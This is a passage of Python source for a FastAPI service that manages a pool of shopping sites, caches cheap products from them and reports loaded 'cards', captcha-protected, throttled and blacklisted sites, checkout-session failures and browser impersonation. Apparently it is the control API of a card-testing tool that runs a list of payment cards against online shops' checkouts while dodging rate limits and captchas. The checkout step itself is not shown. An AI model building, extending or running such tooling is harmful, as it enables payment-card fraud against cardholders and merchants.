    body_sites: Optional[list] = None
    if request.headers.get("content-type", "").startswith("application/json"):
        try:
            body = await request.json()
            if isinstance(body, list):
                body_sites = body
            elif isinstance(body, dict):
                body_sites = body.get("sites")
                if not key:
                    key = body.get("key")
        except Exception:
            pass

    if body_sites is not None:
        site_list = [str(s).strip() for s in body_sites if s and str(s).strip()]
    elif sites:
        site_list = [s.strip() for s in sites.split(",") if s.strip()]
    else:
        return JSONResponse({"error": "no sites provided"}, status_code=400)

    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
        return JSONResponse({"error": "unauthorized"}, status_code=401)

    # Dedupe
    deduped: list[str] = []
    seen: set[str] = set()
    for s in site_list:
        if s in seen:
            continue
        seen.add(s)
        deduped.append(s)

    global _site_pool, _site_pool_loaded_at, _site_pool_source
    old_count = len(_site_pool)
    _site_pool = deduped
    _site_pool_loaded_at = time.time()
    _site_pool_source = "sync" if deduped else "empty"

    log.warning("[sync-sites] pool replaced: %d → %d sites", old_count, len(deduped))

    async def _bg_warmup():
        sem = asyncio.Semaphore(1)
        to_warm = deduped[:60]
        log.warning("[sync-sites] warming %d/%d sites", len(to_warm), len(deduped))
        for s in to_warm:
            async with sem:
                try:
                    await _fetch_products(s, max_price=MAX_PRICE)
                except Exception:
                    pass
                await asyncio.sleep(1.0)
        log.warning("[sync-sites] warmup complete, cache size: %d", len(_product_cache))

    asyncio.create_task(_bg_warmup())

    return JSONResponse({
        "pool_size":     len(deduped),
        "previous":      old_count,
        "warmup_queued": min(len(deduped), 60),
    })


@app.get("/health")
async def health_route():
    cards = _get_cards()
    now = time.time()
    return JSONResponse({
        "status":               "ok",
        "version":              "3.8.5",
        "cards_loaded":         len(cards),
        "site_concurrency":     SITE_CONCURRENCY,
        "cache_ttl":            CACHE_TTL,
        "variant_ttl":          VARIANT_TTL,
        "session_fail_ttl":     SESSION_FAIL_TTL,
        "fail_cache_ttl":       FAIL_CACHE_TTL,
        "throttle_cooldown":    THROTTLE_COOLDOWN,
        "max_price":            MAX_PRICE,
        "min_amount":           MIN_AMOUNT,
        "hard_max_price":       HARD_MAX_PRICE,
        "auto_attempts":        AUTO_ATTEMPTS,
        "race_count":           RACE_COUNT,
        "impersonate":          IMPERSONATE,
        "keys_configured":      len(VALID_API_KEYS),
        "pool_size":            len(_site_pool),
        "pool_source":          _site_pool_source,
        "cached_products":      len(_product_cache),
        "cached_variants":      len(_variant_cache),
        "blacklisted_sites":    sum(1 for s in _site_stats.values()
                                     if now < s.get("blacklisted_until", 0)),
        "throttled_sites":      sum(1 for q in _site_quarantine.values()
                                     if now < q.get("throttled_until", 0)),
        "no_product_sites":     sum(1 for q in _site_quarantine.values()
                                     if q.get("has_products") is False),
        "captcha_sites":        sum(1 for q in _site_quarantine.values()
                                     if q.get("has_captcha") is True),
        "price_too_high_sites": sum(1 for q in _site_quarantine.values()
                                     if q.get("cheapest_price") is not None
                                     and q.get("cheapest_price") > HARD_MAX_PRICE),
        "session_fail_sites":   sum(1 for q in _site_quarantine.values()
                                     if q.get("can_create_session") is False),
    })


@app.get("/stats")
async def stats_route():
    return JSONResponse(dict(_stats))


@app.post("/cache/clear")
async def cache_clear_route():
    pc, vc = len(_product_cache), len(_variant_cache)
    _product_cache.clear()
    _variant_cache.clear()
    return JSONResponse({"cleared_products": pc, "cleared_variants": vc})


@app.post("/site-stats/clear")
async def site_stats_clear_route():
    n1 = len(_site_stats); n2 = len(_site_quarantine)
    _site_stats.clear(); _site_quarantine.clear()
    return JSONResponse({"cleared_stats": n1, "cleared_quarantine": n2})


@app.post("/reload")
async def reload_route():
    _reload_cards()
    _reload_site_pool()
    return JSONResponse({
        "cards_loaded": len(_cards_cache),
        "sites_loaded": len(_site_pool),
    })


if __name__ == "__main__":
    uvicorn.run("api:app", host="0.0.0.0", port=PORT,
                workers=1, log_level=LOG_LEVEL.lower())
